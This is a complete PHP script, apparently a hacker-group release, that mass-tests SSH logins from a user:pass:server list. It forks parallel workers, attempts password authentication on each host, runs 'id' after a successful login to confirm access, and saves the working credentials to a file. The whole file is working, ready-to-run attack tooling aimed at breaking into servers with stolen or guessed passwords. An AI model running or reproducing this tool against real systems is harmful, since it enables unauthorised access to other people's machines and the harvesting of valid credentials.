<?php

/*
  [ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]

  [SCRIPT]: T35T-SSH
  [Execute]: php T35T.php {listssh} {number_thread}
  [ + ] [Format SSH]: user:pass:server

  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Email:        inurlbr@gmail.com
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil

  [ + ]Packages
  First let's install the following packages:
  $ aptitude install php5-dev php5-cli php-pear libssh2-1-dev libssh2-php
 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();
$GLOBALS['line'] = "---------------------------------------------------------------------------";

function __plus() {

    ob_flush();
    flush();
}

echo "{$c['c1']}\n\t\t
\t\t\t\t  _____
\t\t\t\t (_____)  
\t\t\t\t (() ())  
\t\t\t\t  \   /    
\t\t\t\t   \ /      
\t\t\t\t   /=\    
\t\t\t\t  [___]
\n
\n\t\t[ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]\n\t\tNeither war between hackers, nor peace for the system\n
\n\t[ + ] [SCRIPT]: T35T-SSH\n\t[ + ] [Execute]: php T35T.php {listssh} {number_thread}  \n\t[ + ] [Format SSH]: user:pass:server\n\n";
(!isset($argv[1]) && empty($argv[1])) ? exit("\t[ x ] [ ERROR ] DEFINE FILE!\n\n") : NULL;
(!isset($argv[2]) && empty($argv[2])) ? exit("\t[ x ] [ ERROR ] DEFINE NUMER THREAD!\n\n") : NULL;
(!function_exists("ssh2_connect")) ? exit("\t[ x ] [ ERROR ] function ssh2_connect doesn't exist\n\t[ INFO ] INSTALL LIB libssh2-1-dev libssh2-php\n\n") : NULL;
$tgt_ = array_unique(array_filter(explode("\n", file_get_contents($argv[1]))));
echo "\n[ INFO ] STARTING....\n\n";

foreach ($tgt_ as $url) {
    $tgt[] = $url;
    __plus();
}

function __save($_) {
    print("[ + ] [ {$_[2]} / {$_[0]}:{$_[1]} ] Authentication Successful!\n[ + ] [ INFO SERVER ]: {$_[3]}\n{$GLOBALS['line']}\n");
    file_put_contents('ssh_successful.txt', "SERVER:{$_[2]} /USER:{$_[0]} /PASS:{$_[1]} /INFO:{$_[3]}\n", FILE_APPEND);
    __plus();
}

function __exec($dados) {
    if (strstr($dados, ':')) {
        $_ = explode(':', $dados);
        __plus();
        $connection = ssh2_connect($_[2], 22);
        __plus();
        if (ssh2_auth_password($connection, $_[0], $_[1])) {
            __plus();
            $stream = ssh2_exec($connection, 'id');
            stream_set_blocking($stream, true);
            $_[3] = fread($stream, 4096);
            (strstr($_[3], 'uid=')) ? __save($_) : NULL;
            fclose($stream);
            __plus();
        } else {
            print("[ x ] [ {$_[2]} ] Authentication Failed...\n{$GLOBALS['line']}\n");
            __plus();
        }
    } else {
        print("[ x ][ ERROR ] Format invalid {$dados}\n{$GLOBALS['line']}\n");
    }
}

$out = 0;
$thr = $argv[2];
$ini = 0;
$fin = $thr - 1;
while (1) {
    $childs = array();
    for ($count = $ini; $count <= $fin; $count++) {
        if (empty($tgt[$count])) {
            $out = 1;
            continue;
        }
        $pid = pcntl_fork();
        if ($pid == -1) {
            echo "[ x ] [ ERROR ] Fork\n";
            exit(1);
        } else if ($pid) {
            array_push($childs, $pid);
        } else {
            $n = $count + 1;
            __exec($tgt[$count]);
            __plus();
            exit(0);
        }
    }
    foreach ($childs as $key => $pid) {
        pcntl_waitpid($pid, $status);
    }
    if ($out == 1) {
        echo "\n\n[ ! ] [ INFO ]: [ End of process AutoXPL 1.0 at [" . date("d-m-Y H:i:s") . "]\n\n";
        echo "\n\t\t[ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]\n";
        return;
    }
    $ini = $fin + 1;
    $fin = $fin + $thr;
}

  



